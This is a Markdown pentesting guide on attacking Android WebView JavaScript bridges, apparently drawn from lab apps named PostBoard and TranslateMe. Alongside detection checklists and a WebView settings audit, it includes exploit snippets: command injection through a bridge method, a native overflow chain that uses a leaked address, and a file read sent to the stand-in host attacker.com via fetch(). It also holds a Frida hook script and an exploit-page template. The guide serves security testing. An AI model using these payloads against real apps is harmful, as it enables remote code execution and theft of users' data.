# WebView + JavaScript Bridge Attacks

When an Android app uses WebView with `setJavaScriptEnabled(true)` and `addJavascriptInterface()`, any page loaded in that WebView can call the exposed Java methods. If the WebView loads attacker-controlled URLs, this is a direct path to RCE.

## Detection Checklist (Phase 2)

```
□ WebView with JavaScript enabled?
□ addJavascriptInterface() present?
□ What @JavascriptInterface methods are exposed?
□ Can attacker control which URL is loaded? (deep link, intent extra, no domain check)
□ Do bridge methods perform dangerous operations?
□ What WebView security settings are configured?
```

## Attack Pattern: Deep Link → Attacker Page → JS Bridge → RCE

```
Attacker sends link → App loads attacker's page in WebView
→ JavaScript calls @JavascriptInterface methods
→ Bridge method executes dangerous operation (system(), native overflow, file write)
→ RCE / data theft / privilege escalation
```

### Prerequisites
1. WebView has `setJavaScriptEnabled(true)`
2. `addJavascriptInterface(obj, "BridgeName")` exposes methods
3. Attacker can load arbitrary URL (exported activity + deep link with http/https scheme)

## Identifying the Attack Surface

### Step 1: Find the JS Bridge Registration

```java
// Look for this pattern in decompiled source:
webView.addJavascriptInterface(new MyBridge(), "BridgeName");
```

The second argument (`"BridgeName"`) is how JavaScript accesses it:
```javascript
BridgeName.methodName(args);
```

### Step 2: Map All @JavascriptInterface Methods

Every public method annotated with `@JavascriptInterface` is callable from JS:

```java
public class MyBridge {
    @JavascriptInterface
    public void dangerousMethod(String input) { ... }  // ← callable from any loaded page
}
```

### Step 3: Classify Danger Level

| Bridge Method Pattern | Risk | Example |
|----------------------|------|---------|
| Calls `system()` / `Runtime.exec()` | Critical | PostBoard: `CowsayUtil.runCowsay(msg)` |
| Calls native method with buffer ops | Critical | TranslateMe: `testPayload(bytes, len)` |
| Leaks native addresses | Critical | TranslateMe: `getSafeExecutePtr()` |
| Reads/writes files | High | File exfiltration |
| Accesses SharedPreferences | Medium | Data theft |
| Returns sensitive data | Medium | Token/credential leak |
| Only modifies UI | Low | Cosmetic only |

### Step 4: Check URL Loading Restrictions

**Vulnerable (no restriction):**
```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <data android:scheme="http"/>
    <data android:scheme="https"/>
</intent-filter>
```
This accepts ANY http/https URL — attacker hosts exploit page anywhere.

**Less vulnerable (custom scheme):**
```xml
<data android:scheme="myapp" android:host="specific"/>
```
Attacker needs to trigger `myapp://specific/...` — still exploitable via other apps or redirects.

**Safe (domain-restricted):**
```xml
<data android:scheme="https" android:host="trusted.example.com"/>
```
Only loads pages from trusted domain (but check `shouldOverrideUrlLoading` for bypasses).

## Exploitation Patterns

### Pattern 1: JS Bridge → Command Injection (PostBoard)

```java
// Bridge method calls shell with unsanitized input
@JavascriptInterface
public void postCowsayMessage(String msg) {
    CowsayUtil.runCowsay(msg);  // → system("/bin/sh -c 'script " + msg + "'")
}
```

**Exploit (from attacker's page):**
```javascript
WebAppInterface.postCowsayMessage(";id > /data/data/pkg/pwned.txt");
```

### Pattern 2: JS Bridge → Native Buffer Overflow (TranslateMe)

```java
// Bridge exposes native methods with exploit primitives
@JavascriptInterface
public long getSafeExecuteAddress() { return getSafeExecutePtr(); }  // ASLR leak

@JavascriptInterface
public String createPayload(long addr, String cmd) { ... }  // Payload builder

@JavascriptInterface
public int testPayloadBytes(String payload) { return testPayload(...); }  // Trigger
```

**Exploit (from attacker's page):**
```javascript
var addr = TranslatorBridge.getSafeExecuteAddress();
var payload = TranslatorBridge.createPayload(addr, "id");
TranslatorBridge.testPayloadBytes(payload);
```

### Pattern 3: JS Bridge → File Access

```java
@JavascriptInterface
public String readFile(String path) {
    return new String(Files.readAllBytes(Paths.get(path)));
}
```

**Exploit:**
```javascript
var data = Bridge.readFile("/data/data/com.app/databases/secrets.db");
// Exfiltrate via fetch() to attacker server
fetch("http://attacker.com/exfil", {method: "POST", body: data});
```

### Pattern 4: XSS → JS Bridge (PostBoard)

When the deep link doesn't directly load a URL but injects into JavaScript:
1. Find the injection point (e.g., `loadUrl("javascript:method('" + input + "')")`)
2. Bypass escaping (e.g., backslash trick: `\'` → `\\'`)
3. Break out of JS string → call bridge methods

```
Deep link payload → JS string escape bypass → call @JavascriptInterface → RCE
```

## WebView Security Settings Audit

| Setting | Secure Value | Risk if Misconfigured |
|---------|-------------|----------------------|
| `setJavaScriptEnabled` | `false` (if no JS needed) | XSS, bridge exploitation |
| `setAllowFileAccess` | `false` | `file://` scheme access to local files |
| `setAllowContentAccess` | `false` | `content://` provider access |
| `setAllowFileAccessFromFileURLs` | `false` | Cross-file access from file:// pages |
| `setAllowUniversalAccessFromFileURLs` | `false` | file:// pages access any origin |
| `setMixedContentMode` | `MIXED_CONTENT_NEVER_ALLOW` | MITM downgrade attacks |
| `usesCleartextTraffic` (manifest) | `false` | HTTP traffic interception |

## Frida Validation Template

```python
import frida, time, subprocess

device = frida.get_usb_device()
subprocess.run(['adb', 'shell', 'am', 'force-stop', 'PACKAGE'])
time.sleep(1)

pid = device.spawn(['PACKAGE'])
session = device.attach(pid)

script = session.create_script("""
Java.perform(function() {
    // Hook all @JavascriptInterface methods
    var Bridge = Java.use("com.app.BridgeClass");
    
    Bridge.dangerousMethod.implementation = function(input) {
        console.log("[*] Bridge.dangerousMethod called: " + input);
        send("BRIDGE_CALL:" + input);
        var result = this.dangerousMethod(input);
        console.log("[*] Result: " + result);
        send("BRIDGE_RESULT:" + result);
        return result;
    };
    
    send("READY");
});
""")

results = []
def on_message(msg, data):
    if msg['type'] == 'send':
        print(f"[*] {msg['payload']}")
        results.append(msg['payload'])

script.on('message', on_message)
script.load()
device.resume(pid)
time.sleep(3)

# Trigger by loading attacker page
subprocess.run(['adb', 'shell', 'am', 'start', '-a', 'android.intent.action.VIEW',
    '-d', 'http://attacker.com/exploit.html'])
time.sleep(5)
```

## Remote Exploit Page Template

```html
<!DOCTYPE html>
<html>
<head><title>Exploit</title></head>
<body>
<script>
// Check if bridge is available
if (typeof BridgeName !== 'undefined') {
    // Call dangerous method
    BridgeName.dangerousMethod("payload");
    document.body.innerHTML = "<h1>Exploited</h1>";
} else {
    document.body.innerHTML = "<h1>Bridge not available</h1>";
}
</script>
</body>
</html>
```

## Key Insight

**WebView + JS Bridge + Unrestricted URL Loading = Remote RCE**

This is the mobile equivalent of a web app with an unauthenticated admin API. The JS bridge methods are your "API endpoints" — if any of them perform dangerous operations and the WebView loads attacker-controlled pages, you have remote code execution.

Always check: Can I load my own page in this WebView? If yes, what can I call via the bridge?
